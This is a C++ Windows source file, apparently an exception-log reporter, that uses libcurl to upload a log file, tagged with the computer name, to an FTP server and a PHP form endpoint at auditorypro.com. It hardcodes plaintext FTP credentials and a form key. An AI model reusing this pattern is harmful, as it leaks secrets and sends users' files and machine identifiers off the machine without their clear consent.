#include <string>
#include <process.h>
#include <curl/curl.h>

using namespace std;

#define FILENAME_PREFIX	"token"
#define FTP_URL      "ftp://auditorypro.com/"
#define POST_URL      "http://www.auditorypro.com/explog/post.php"

size_t WriteMemoryCallback(void *ptr, size_t size, size_t nmemb, void *data)
{
  size_t realsize = size * nmemb;
  string *mem = (string *)data;
  *mem += string((char *)ptr, realsize);
  return realsize;
}

void uploadLogFile(void *fname)
{
	CURL *curl;
	CURLcode res;
	FILE * file;
	string FtpURL, rfname, outstr;
	file = fopen((char *)fname, "rb");

	curl_global_init(CURL_GLOBAL_ALL);
	curl = curl_easy_init();
	if(file && curl) {
		char buf[100] = "";
		DWORD cbComputerName = sizeof(buf);
		GetComputerName(buf, &cbComputerName);
		rfname = FILENAME_PREFIX "_";
		rfname += buf;

		time_t time0 = time(NULL);
		strftime(buf, sizeof(buf), "_%Y_%m_%d_%H%M.log", localtime(&time0));
		rfname += buf;
		
		FtpURL = FTP_URL + rfname;

		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1);
		curl_easy_setopt(curl, CURLOPT_USERPWD, "explog:explog_09");
		curl_easy_setopt(curl, CURLOPT_URL, FtpURL.c_str());
		curl_easy_setopt(curl, CURLOPT_READDATA, file);
		curl_easy_setopt(curl, CURLOPT_READFUNCTION, fread);
		res = curl_easy_perform(curl);
		curl_easy_cleanup(curl);
	}
	fclose(file);

	curl = curl_easy_init();
	struct curl_httppost* post = NULL;
	struct curl_httppost* last = NULL;
	curl_formadd(&post, &last, CURLFORM_PTRNAME, "key",
						CURLFORM_PTRCONTENTS, "explog123", CURLFORM_END); 
	curl_formadd(&post, &last, CURLFORM_PTRNAME, "to",
						CURLFORM_PTRCONTENTS, "explog@auditorypro.com", CURLFORM_END); 
	curl_formadd(&post, &last, CURLFORM_PTRNAME, "subject",
						CURLFORM_PTRCONTENTS, rfname.c_str(), CURLFORM_END); 
	curl_formadd(&post, &last, CURLFORM_COPYNAME, "body",
						CURLFORM_FILECONTENT, fname, CURLFORM_END);
	curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
	curl_easy_setopt(curl, CURLOPT_URL, POST_URL);
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&outstr);
	curl_easy_perform(curl);
	curl_formfree(post);
	curl_global_cleanup();
	if (!outstr.empty())
		MessageBox(NULL, outstr.c_str(), "POST result", MB_OK);
	_endthread();
}
